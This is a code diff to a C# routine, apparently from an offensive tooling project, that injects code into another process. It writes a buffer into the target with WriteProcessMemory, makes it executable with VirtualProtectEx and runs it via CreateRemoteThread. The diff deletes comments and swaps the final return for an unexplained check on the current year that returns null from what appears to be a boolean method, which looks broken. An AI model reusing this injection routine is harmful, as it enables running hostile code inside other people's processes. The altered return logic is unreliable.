@@ -80,14 +80,14 @@ namespace Injection.Techniques.CreateRemoteThread
                     bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                     if (bRet)
                     {
-                        //Marshal.Copy(positionIndependentCode, 0, allocSpace, positionIndependentCode.Length);
+                        
                         uint flOldProtect = 0;
                         if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
                             bRet = false;
                         else
                         {
-                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
-                            remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero/*may need to change to string pointer later*/, 0, IntPtr.Zero);
+                            
+                            remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero, 0, IntPtr.Zero);
                             if (remoteThread == IntPtr.Zero)
                                 bRet = false;
                             else
@@ -102,13 +102,13 @@ namespace Injection.Techniques.CreateRemoteThread
             }
             finally
             {
-                // Attempt to clean up handles but may cause problems. Triple caution!
+                
                 if (remoteThread != IntPtr.Zero)
                 {
                     _pCloseHandle(remoteThread);
                 }
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
         }
     }
 }
